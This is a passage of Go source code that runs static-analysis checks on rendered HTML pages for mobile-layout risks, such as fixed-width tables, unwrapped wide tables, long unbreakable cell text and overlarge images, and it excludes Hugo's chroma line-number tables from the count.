	scrollWrapperStyleRe = regexp.MustCompile(`overflow(-x)?\s*:\s*(auto|scroll)`)
)

// computeResponsiveChecks runs the #1138 static-analysis mobile-layout
// heuristics over an already-parsed rendered document. See
// responsiveChecksDTO's doc comment for what each field does and does not
// mean.
func computeResponsiveChecks(doc *html.Node) responsiveChecksDTO {
	var tables responsiveTablesDTO
	codeBlocks := 0
	codeBlockUnsafe := false
	images := 0
	imageUnsafe := false

	walkNodes(doc, func(n *html.Node) bool {
		if n.Type != html.ElementNode {
			return true
		}
		switch n.Data {
		case "table":
			if isChromaLineNumberTable(n) {
				return true
			}
			tables.Count++
			if elementHasFixedPixelWidth(n) {
				tables.FixedWidth++
			}
			if tableHasResponsiveWrapper(n) {
				tables.ResponsiveWrapper++
			}
			if tableHasLongUnbreakableCell(n) {
				tables.LongCellRisk++
			}
		case "pre":
			codeBlocks++
			if elementHasFixedPixelWidth(n) || strings.Contains(strings.ToLower(htmlAttr(n, "style")), "nowrap") {
				codeBlockUnsafe = true
			}
		case "img":
			images++
			if imageHasFixedOverlargeWidth(n) {
				imageUnsafe = true
			}
		}
		return true
	})

	return responsiveChecksDTO{
		Tables:     tables,
		CodeBlocks: responsiveCodeBlocksDTO{Count: codeBlocks, OverflowSafe: !codeBlockUnsafe},
		Images:     responsiveImagesDTO{Count: images, Responsive: !imageUnsafe},
	}
}

// elementHasFixedPixelWidth reports a hardcoded, non-percentage width via
// either the legacy `width` attribute (a bare integer, per the HTML4 table/
// img convention still emitted by some content pipelines) or an inline
// `width: Npx` style declaration.
func elementHasFixedPixelWidth(n *html.Node) bool {
	if w := strings.TrimSpace(htmlAttr(n, "width")); w != "" && !strings.HasSuffix(w, "%") {
		if _, err := strconv.Atoi(w); err == nil {
			return true
		}
	}
	return inlineFixedWidthPxRe.MatchString(htmlAttr(n, "style"))
}

// tableHasResponsiveWrapper walks table's ancestor chain looking for a
// class or inline style suggesting horizontal-scroll wrapping — the common
// theme idiom for making a wide table usable on a narrow viewport. Requires
// the value to indicate scrolling specifically (auto/scroll), not merely
// contain "overflow" — overflow:hidden clips content instead of scrolling
// it and is not protection, despite being a very common ancestor class
// (mobile-menu-open states, rounded-corner card clipping, Tailwind
// utilities).
func tableHasResponsiveWrapper(table *html.Node) bool {
	for p := table.Parent; p != nil; p = p.Parent {
		if p.Type != html.ElementNode {
			continue
		}
		class := strings.ToLower(htmlAttr(p, "class"))
		style := strings.ToLower(htmlAttr(p, "style"))
		if strings.Contains(class, "table-responsive") || strings.Contains(class, "table-wrap") ||
			strings.Contains(class, "scrollable") ||
			scrollWrapperClassRe.MatchString(class) || scrollWrapperStyleRe.MatchString(style) {
			return true
		}
	}
	return false
}

// chromaTableSelfOrAncestorClasses are the class names Hugo's chroma
// syntax highlighter emits when lineNumbersInTable is enabled, wrapping
// every code block in a real <table> purely for line-number alignment.
// Without this exclusion, tables.count would include every code block on
// the page and long_cell_risk would fire on ordinary code lines >=25
// characters — noise on exactly the content type this check is least
// useful for.
var chromaTableSelfOrAncestorClasses = map[string]bool{
	"lntable": true, "highlighttable": true, "chroma": true, "highlight": true,
}

func isChromaLineNumberTable(table *html.Node) bool {
	for n := table; n != nil; n = n.Parent {
		if n.Type != html.ElementNode {
			continue
		}
		for _, cls := range strings.Fields(strings.ToLower(htmlAttr(n, "class"))) {
			if chromaTableSelfOrAncestorClasses[cls] {
				return true
			}
		}
	}
	return false
}

// tableHasLongUnbreakableCell reports whether any <td>/<th> under table
// contains a single unspaced token 25+ characters long (a URL, file path,
// or similarly long string) that can force the table wider than its
// container even inside a wrapping element that only handles word-wrap.
func tableHasLongUnbreakableCell(table *html.Node) bool {
	found := false
	var walk func(*html.Node)
	walk = func(n *html.Node) {
		if n == nil || found {
			return
		}
		if n.Type == html.ElementNode && (n.Data == "td" || n.Data == "th") {
			for _, tok := range strings.Fields(renderTextContent(n)) {
				if longUnbreakableToken.MatchString(tok) {
					found = true
					return
				}
			}
		}
		for c := n.FirstChild; c != nil && !found; c = c.NextSibling {
			walk(c)
		}
	}
	walk(table)
	return found
}

// imageHasFixedOverlargeWidth reports a hardcoded pixel width over 400 with
// no responsive escape hatch (a `max-width` style or a `srcset` attribute
// both indicate the theme/author already accounted for narrow viewports).
func imageHasFixedOverlargeWidth(img *html.Node) bool {
	if strings.Contains(strings.ToLower(htmlAttr(img, "style")), "max-width") {
		return false
	}
	if strings.TrimSpace(htmlAttr(img, "srcset")) != "" {
		return false
	}
	w := strings.TrimSpace(htmlAttr(img, "width"))
	if w == "" || strings.HasSuffix(w, "%") {
		return false
	}
	n, err := strconv.Atoi(w)
	if err != nil {
		return false
	}
	return n > 400
}

// renderTextContent concatenates all descendant text nodes of n, space
// separated. Mirrors internal/site's unexported textContent helper; kept
// separate since that one isn't exported across packages.
func renderTextContent(n *html.Node) string {
	var buf strings.Builder
	var walk func(*html.Node)
	walk = func(cur *html.Node) {
		if cur == nil {
			return
		}
		if cur.Type == html.TextNode {
			buf.WriteString(cur.Data)
			buf.WriteByte(' ')
		}
		for c := cur.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(n)
	return strings.TrimSpace(buf.String())
}
